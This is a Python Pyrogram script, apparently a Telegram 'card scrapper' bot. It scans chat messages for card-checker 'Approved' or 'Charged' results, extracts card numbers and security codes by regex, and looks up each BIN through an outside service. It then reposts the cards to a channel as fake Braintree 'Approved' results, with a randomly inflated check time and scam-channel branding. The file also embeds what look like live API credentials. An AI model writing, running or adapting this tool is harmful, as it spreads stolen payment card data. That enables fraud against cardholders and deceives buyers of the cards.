import random
import time
import re
import aiohttp
import asyncio
from pyrogram import Client, filters

api_id = '26559895'  # Replace with your api id
api_hash = '1ef0afc6e062e283e6295cb4c960c6a9'  # Replace with your api hash
bot_token = 'YOUR_BOT_TOKEN'  # Replace with your bot token

app = Client('black_scrapper', api_id, api_hash, bot_token=bot_token)

BIN_API_URL = 'https://bins.antipublic.cc/bins/{}'

# Function to filter card information using regex
def filter_cards(text):
    regex = r'\d{16}.*\d{3}'
    matches = re.findall(regex, text)
    return matches

# Function to perform BIN lookup
async def bin_lookup(bin_number):
    bin_info_url = BIN_API_URL.format(bin_number)
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
        async with session.get(bin_info_url) as response:
            if response.status == 200:
                try:
                    bin_info = await response.json()
                    return bin_info
                except aiohttp.ContentTypeError:
                    return None
            else:
                return None

# Event handler for new messages
@app.on_message(filters.text)
async def anukarop(client, message):
    try:
        # Regex to match approved messages
        if re.search(r'(Approved!|Charged|authenticate_successful|𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱|- 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅|APPROVED|New Cards Found By Scrapper|ꕥ Extrap [☭]|• New Cards Found By JennaS>)', message.text):
            filtered_card_info = filter_cards(message.text)
            if not filtered_card_info:
                return

            start_time = time.time()  # Start timer

            for card_info in filtered_card_info:
                bin_number = card_info[:6]
                bin_info = await bin_lookup(bin_number)
                if bin_info:
                    brand = bin_info.get("brand", "N/A")
                    card_type = bin_info.get("type", "N/A")
                    level = bin_info.get("level", "N/A")
                    bank = bin_info.get("bank", "N/A")
                    country = bin_info.get("country_name", "N/A")
                    country_flag = bin_info.get("country_flag", "")

                    # Calculate time taken with random addition
                    random_addition = random.uniform(0, 10) + 10  # Add random seconds between 10 and 20
                    time_taken = time.time() - start_time + random_addition
                    formatted_time_taken = f"{time_taken:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"
                  
                    # Format the message
                    formatted_message = (
                        f"**[-]**(t.me/verifiedscam) 𝐀𝐩𝐩𝐫𝗼𝐯𝗲𝐝 ✅\n\n"
                        f"**[-]**(t.me/verifiedscam) 𝗖𝗮𝗿𝗱: `{card_info}`\n"
                        f"**[-]**(t.me/verifiedscam) 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Braintree Auth 4\n"
                        f"**[-]**(t.me/verifiedscam) 𝐑𝐞𝐬𝗽𝗼𝐧𝐬𝗲: `1000: Approved`\n\n"
                        f"**[-]**(t.me/verifiedscam) 𝗜𝗻𝗳𝗼: {brand} - {card_type} - {level}\n"
                        f"**[-]**(t.me/verifiedscam) 𝐈𝐬𝐬𝐮𝐞𝐫: {bank}\n"
                        f"**[-]**(t.me/verifiedscam) 𝐂𝗼𝐮𝐧𝐭𝐫𝐲: {country} {country_flag}\n\n"
                        f"𝗧𝗶𝗺𝗲: {formatted_time_taken}"
                    )

                    # Send the formatted message
                    await client.send_message('scrappin', formatted_message, disable_web_page_preview=True)
                    await asyncio.sleep(30)  # Wait for 30 seconds before sending the next message
    except Exception as e:
        print(e)

# Main function to start the client
async def main():
    await app.start()
    print("Client Created")
    await app.run_until_disconnected()

# Run the main function
asyncio.run(main())
